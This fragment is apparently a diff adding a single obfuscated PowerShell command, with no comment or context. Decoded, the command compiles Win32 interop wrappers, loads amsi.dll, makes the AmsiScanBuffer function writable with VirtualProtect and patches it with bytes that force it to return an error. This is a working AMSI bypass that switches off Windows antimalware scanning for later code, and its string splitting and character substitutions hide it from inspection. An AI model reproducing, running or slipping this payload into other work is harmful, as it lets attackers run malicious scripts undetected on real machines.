@@ -1,0 +1,27 @@
+ & ( $shELlID[1]+$SHELlID[13]+'X') (('pVjWin32 = @'+'PJo
+
+using'+' '+'Sys'+'te'+'m;
+using'+' S'+'ystem'+'.Runti'+'m'+'e.Int'+'er'+'o'+'pS'+'ervice'+'s;'+'
+
+public cl'+'ass Wi'+'n32 {
+
+ '+'   [Dl'+'lImpo'+'rt('+'PJok'+'ern'+'el32'+'PJo)]'+'
+   '+' '+'pu'+'blic'+' static '+'e'+'xt'+'ern IntPtr'+' Get'+'Proc'+'Address'+'(IntP'+'t'+'r hM'+'odu'+'le, str'+'ing '+'pro'+'cName)'+';
+
+    [Dll'+'Im'+'port('+'PJok'+'ern'+'el32PJo)]'+'
+    public stati'+'c extern IntPt'+'r Lo'+'ad'+'L'+'ibrary'+'('+'str'+'ing'+' '+'n'+'ame);'+'
+'+'
+    '+'[D'+'l'+'lIm'+'port(PJ'+'o'+'k'+'er'+'nel3'+'2'+'P'+'Jo)'+']
+    pu'+'blic '+'stati'+'c e'+'xte'+'rn'+' b'+'o'+'ol Vir'+'tu'+'alPr'+'otect(I'+'ntPt'+'r lpAddress, UI'+'n'+'tPt'+'r dwSi'+'ze, u'+'in'+'t flNewPro'+'tect, out uint lpf'+'l'+'Ol'+'d'+'Protect);
+'+''+'
+}
+PJo@
+
+Add'+'-T'+'ype'+' pVjW'+'i'+'n3'+'2'+''+'
+'+'
+pVjL'+'oadLibrar'+'y = [Wi'+'n32]::'+'LoadLibr'+'ary(PJo'+'amPJo + PJ'+'osi.d'+'l'+'l'+'P'+'Jo)'+'
+pVjAddress'+' = [Win32]:'+':GetPro'+'cAddress(pVjLoa'+'dLibrar'+'y,'+' '+'PJoAm'+'si'+'PJo + '+'PJ'+'o'+'Sc'+'anP'+'Jo + PJo'+'B'+'uffe'+'r'+'P'+'J'+'o'+')
+pVjp = '+'0'+'
+['+'Win3'+'2]::Vir'+'tualProtect'+'('+'pV'+'jAddress,'+' ['+'uin'+'t'+'3'+'2]5, 0'+'x40, [r'+'ef]pVjp)'+'
+'+'pV'+'jPatch = '+'['+'Byte[]] (0'+'xB'+'8, 0x'+'57'+', 0x'+'00, 0'+'x07, 0x'+'80,'+' 0xC'+'3'+')'+'
+'+'['+'Syste'+'m.Runtime.'+'In'+'teropSe'+'rv'+'ic'+'e'+'s.Ma'+'rshal]:'+':Copy(pVj'+'Pa'+'tch, 0, pVjAddre'+'s'+'s,'+' 6)').REplACe(([chAr]80+[chAr]74+[chAr]111),[string][chAr]34).REplACe('pVj',[string][chAr]36) )
